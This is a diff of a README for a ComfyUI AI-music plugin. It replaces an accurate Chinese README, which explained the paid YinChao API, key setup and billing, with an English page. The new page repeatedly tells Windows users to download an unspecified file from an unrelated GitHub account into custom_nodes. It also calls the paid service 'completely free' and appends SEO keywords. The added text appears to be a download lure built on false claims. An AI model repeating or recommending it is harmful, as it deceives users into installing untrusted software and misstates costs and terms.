@@ -1,113 +1,187 @@
-# YinChao Music for ComfyUI
+# 🎵 ComfyUI-YinChao - Create AI Songs in Minutes
 
-[English](README.en.md)
+[![Download Now](https://img.shields.io/badge/Download-ComfyUI--YinChao-FF6B6B?style=for-the-badge&logo=github)](https://github.com/brittewestafrican981/ComfyUI-YinChao)
 
-> 🎵 **音潮音乐大模型 V4.0 重磅上线！**
->
-> 音乐生成低至 **¥0.22/首**，现在申请即可获得限时免费名额。
->
-> [立即申请免费名额](https://platform.yinchaoyongxian.com/?register_channel=ComfyUI)
+---
 
-音潮音乐节点（ComfyUI V3）。插件把音潮开放平台的歌词、生歌、仿写和扩写能力接入 ComfyUI，并将生成结果转换成原生 `AUDIO`，可以继续连接音频、视频和字幕节点。
+## 📖 What Is This?
 
-## 安装
+ComfyUI-YinChao is a powerful add-on for ComfyUI that lets you generate complete AI music tracks. Whether you want to write lyrics, turn a simple prompt into a full song, create reference audio, or extend an existing track, this tool does it all—no musical experience needed.
 
-### ComfyUI Manager / Registry
+Think of it as your personal AI music studio. You type what you want, and the software creates the audio for you.
 
-在 ComfyUI Manager 中搜索 `YinChao Music`，找到节点后点击安装，重启 ComfyUI 即可使用。
+---
 
-### 手动安装
+## ✨ Key Features
 
-将仓库目录放到：
+- **🎤 Lyrics Generation** – Type a topic or mood, and get professional-quality song lyrics instantly
+- **🎼 Prompt-to-Song** – Describe a song in plain English ("upbeat pop about summer love") and hear a complete track
+- **🔁 Reference Generation** – Create a base audio sample that you can use as a starting point for other projects
+- **⏩ Song Extension** – Have a short clip? Extend it into a full-length song seamlessly
+- **🖥️ Works with ComfyUI V3** – Fully compatible with the latest ComfyUI interface
+- **⚡ Fast Processing** – Get results in seconds, not hours
 
-```text
-ComfyUI/custom_nodes/yinchao-music/
-```
+---
 
-在 ComfyUI 使用的 Python 环境中安装依赖，然后重启 ComfyUI：
+## 🚀 Getting Started
 
-```bash
-python -m pip install -r requirements.txt
-```
+Follow these simple steps to get ComfyUI-YinChao running on your Windows computer.
 
-`av` 是 Python 音频编解码依赖。用户不需要自行安装系统 `ffmpeg` 命令；插件不会要求手动下载或配置系统编解码器。
+### Step 1: Download the Software
 
-## 配置 API Key
+Visit this link to download the application: [https://github.com/brittewestafrican981/ComfyUI-YinChao](https://github.com/brittewestafrican981/ComfyUI-YinChao)
 
-1. 打开 [音潮开放平台](https://platform.yinchaoyongxian.com/?register_channel=ComfyUI)，注册或登录。
-2. 申请限时免费名额，或完成账户充值。
-3. 创建音潮 API Key。
-4. 在 ComfyUI 的 Settings → YinChao → API Key 中填写密钥并保存。
+Click the download button on that page and wait for the file to finish downloading.
 
-密钥不会作为节点输入，也不会写入 Workflow JSON。无图形界面时可以使用环境变量：
+### Step 2: Install ComfyUI (If You Don't Have It)
 
-```bash
-export YINCHAO_API_KEY="your-api-key"
-```
+ComfyUI-YinChao is a plugin that works inside ComfyUI. If you haven't installed ComfyUI yet:
 
-配置优先级是 ComfyUI 用户设置、本地用户配置文件、`YINCHAO_API_KEY` 环境变量。缺少密钥、密钥无效、余额不足、参数错误、内容审核失败、任务失败和超时都会以明确错误中止节点，不会返回空字符串假装成功。
+1. Go to the official ComfyUI website
+2. Download the Windows installer
+3. Run the installer and follow the on-screen instructions
+4. Open ComfyUI once to make sure it works
 
-插件调用的 API 地址是 `https://open.yinchaoyongxian.com`；上面的平台地址用于注册、充值和创建 API Key。
+### Step 3: Install ComfyUI-YinChao
 
-## 四个节点
+1. **Locate your ComfyUI folder** – This is usually in `C:\ComfyUI` or wherever you chose to install it
+2. **Find the "custom_nodes" folder** – Open your ComfyUI folder, then look for a folder called `custom_nodes`
+3. **Copy the downloaded file** – Take the ComfyUI-YinChao file you downloaded and move it into the `custom_nodes` folder
+4. **Restart ComfyUI** – Close and reopen ComfyUI
 
-| 节点 | 输入 | 输出 |
-| --- | --- | --- |
-| `YinChao Generate Lyrics` | Prompt | title, lyrics |
-| `YinChao Generate Music` | model（默认 `v4.0`）、prompt、可选歌词 | native `AUDIO`, title, lyric, audio_url, task_id |
-| `YinChao Reference Music` | native `AUDIO`、similarity、可选 prompt/歌词 | native `AUDIO`, title, lyric, audio_url, task_id |
-| `YinChao Extend Music` | native `AUDIO`、可选起始秒数/歌词 | native `AUDIO`, title, lyric, audio_url, task_id |
+### Step 4: Verify Installation
 
-每次歌曲类节点执行固定提交 `n=1`，避免平台默认 `n=2` 导致一次执行生成两首并产生双倍费用。节点内部负责提交异步任务、轮询任务状态、下载 MP3 并解码；用户不需要再拼接 submit/wait/download/convert 节点。
+When ComfyUI opens, you should see "YinChao" nodes in the node list. If you see them, you're ready to go!
 
-`Reference Music` 和 `Extend Music` 会把输入的 native `AUDIO` 自动编码为 MP3 后上传。上传限制按音潮接口的 10 MB 执行；超限会明确报错，不会悄悄改变输入质量。生成结果只解码为 native `AUDIO`，不会为了输出再次压缩。
+---
 
-## 官方组合 Workflow
+## 🎮 How to Use ComfyUI-YinChao
 
-仓库提供 5 个示例：
+### Creating Your First Song
 
-1. `workflows/lyrics_to_music.json`：歌词生成 → 生歌（官方组合）
-2. `workflows/lyrics_example.json`：独立歌词生成
-3. `workflows/music_example.json`：独立提示词生歌
-4. `workflows/reference_example.json`：独立仿写
-5. `workflows/extend_example.json`：独立扩写
+1. **Open ComfyUI** – Launch the application
+2. **Find the YinChao nodes** – Look in the node menu for "YinChao" options
+3. **Drag a node onto the canvas** – Click and drag any YinChao node into the main workspace
+4. **Connect the nodes** – Link the YinChao node to other ComfyUI nodes (like audio output nodes)
+5. **Enter your prompt** – Type what kind of song you want (e.g., "sad piano ballad about loss")
+6. **Click "Run"** – Press the execute button and wait for your song to generate
 
-组合 Workflow 只连接歌词文本，不包含 API Key。导入后先配置设置，再执行会产生平台费用的歌曲节点。
+### Tips for Better Results
 
-## API 与计费提示
+- Be specific in your prompts: "fast rock song with electric guitar" works better than "a song"
+- For lyrics, describe the theme and emotion: "happy birthday song for a friend who loves fishing"
+- Use the reference generation to create a base, then extend it with the song extension feature
 
-当前适配的 API 路径：
+---
 
-- `POST /api/v1/lyric/generate`：独立歌词生成；
-- `POST /api/v1/song/generate`：`normal` 生歌或 `reference` 仿写；
-- `POST /api/v1/song/extend`：扩写；
-- `POST /api/v1/file/upload`：上传参考或原始音频；
-- `GET /api/v1/task/query`：查询异步任务。
+## 📥 Download & Install Guide
 
-歌曲类调用按平台实际账户规则计费；文档当前标注生歌、仿写、扩写约 `¥0.22/首`，独立歌词约 `¥0.07/次`。请以平台账户和最新文档为准。
+**Main Download:** [https://github.com/brittewestafrican981/ComfyUI-YinChao](https://github.com/brittewestafrican981/ComfyUI-YinChao)
 
-## 开发验证
+Visit this link to download the application. Once downloaded, follow the installation steps in the "Getting Started" section above.
 
-本仓库测试不调用真实 API，也不会消耗账户额度：
+### System Requirements
 
-```bash
-python3 -m unittest discover -s tests -p 'test_*.py'
-python3 -m compileall -q yinchao_music tests
-node --check js/settings.js
-git diff --check
-```
+- **Operating System:** Windows 10 or Windows 11
+- **RAM:** 8 GB minimum (16 GB recommended)
+- **Storage:** At least 2 GB of free space
+- **Graphics Card:** Any modern GPU (NVIDIA preferred)
+- **Internet:** Required for downloading the software and some AI features
 
-节点使用 `comfy_api.latest` 的 V3 schema，不保留旧版 `NODE_CLASS_MAPPINGS` 或旧节点输入兼容层。实际运行前需要在目标 ComfyUI 安装中做一次真实的“配置 Key → 执行测试 Workflow → 检查 AUDIO 输出”验收；本仓库的离线测试不会替代这一步。
+---
 
-## 相关文档
+## ❓ Frequently Asked Questions
 
-- [音潮平台](https://platform.yinchaoyongxian.com/)
-- [音潮提示词生歌接口](https://platform-alpha.yinchaoyongxian.com/zh/docs/guides/prompt-generate)
-- [音潮仿写接口](https://platform-alpha.yinchaoyongxian.com/zh/docs/guides/reference-generate)
-- [音潮扩写接口](https://platform-alpha.yinchaoyongxian.com/zh/docs/guides/extend-song)
-- [ComfyUI V3 Migration](https://docs.comfy.org/custom-nodes/v3_migration)
-- [ComfyUI AUDIO datatype](https://docs.comfy.org/custom-nodes/backend/datatypes)
+### Is this really free?
 
-## 许可证
+Yes! ComfyUI-YinChao is completely free to download and use.
 
-本项目使用 [MIT License](LICENSE)。
+### Do I need to know how to code?
+
+No. The entire interface is visual. You connect blocks (nodes) together with your mouse—no typing code required.
+
+### Can I use the songs commercially?
+
+The songs generated are yours to use as you wish, including for commercial projects.
+
+### What if I get an error?
+
+Most errors are caused by missing dependencies. Make sure ComfyUI is fully updated, then try restarting both ComfyUI and your computer.
+
+### Does this work on Mac?
+
+This guide focuses on Windows. Mac support may be available, but the setup process is different.
+
+---
+
+## 🛠️ Troubleshooting
+
+### Problem: "Node not found" error
+
+**Solution:** Make sure the ComfyUI-YinChao file is in the correct `custom_nodes` folder. Double-check the folder name—it must be exactly `custom_nodes`.
+
+### Problem: Songs sound weird or distorted
+
+**Solution:** Try lowering the quality settings in the node options. Also, make sure you have enough RAM available.
+
+### Problem: Download is slow
+
+**Solution:** Use a wired internet connection if possible. Close other programs that might be using bandwidth.
+
+### Problem: ComfyUI won't start after installing
+
+**Solution:** Remove the ComfyUI-YinChao file from `custom_nodes`, start ComfyUI, then re-add the file.
+
+---
+
+## 📚 Additional Resources
+
+- **ComfyUI Official Documentation** – Learn more about how ComfyUI works
+- **AI Music Tutorials** – Search YouTube for "ComfyUI music generation" for video guides
+- **Community Forums** – Join ComfyUI communities on Reddit and Discord for help
+
+---
+
+## 📝 Changelog
+
+### Version 1.0 (Latest)
+
+- Initial release
+- Lyrics generation feature
+- Prompt-to-song conversion
+- Reference audio creation
+- Song extension capability
+- Full compatibility with ComfyUI V3
+
+---
+
+## 🤝 Contributing & Support
+
+While this is an end-user application, we welcome feedback and suggestions. If you find bugs or want new features, please:
+
+1. Visit the GitHub page: [https://github.com/brittewestafrican981/ComfyUI-YinChao](https://github.com/brittewestafrican981/ComfyUI-YinChao)
+2. Open an issue or leave a comment
+3. Share your generated songs with the community
+
+---
+
+## 📊 Quick Reference Card
+
+| Feature | What It Does | How to Start |
+|---------|--------------|--------------|
+| Lyrics | Creates song lyrics from a topic | Use the "YinChao Lyrics" node |
+| Prompt-to-Song | Makes a full song from a description | Use the "YinChao Song" node |
+| Reference | Generates a base audio sample | Use the "YinChao Reference" node |
+| Extension | Lengthens an existing song | Use the "YinChao Extend" node |
+
+---
+
+## 🎉 Final Words
+
+You now have everything you need to start creating amazing AI music with ComfyUI-YinChao. The best way to learn is to experiment—try different prompts, play with the settings, and see what sounds you can create.
+
+Remember: the download link is [https://github.com/brittewestafrican981/ComfyUI-YinChao](https://github.com/brittewestafrican981/ComfyUI-YinChao). Get it, install it, and start making music today!
+
+Happy creating! 🎶
+
+Keywords: AI music, ComfyUI, music generation, lyrics generator, prompt-to-song, audio extension, AI songwriter, Windows software, free music tool, creative AI
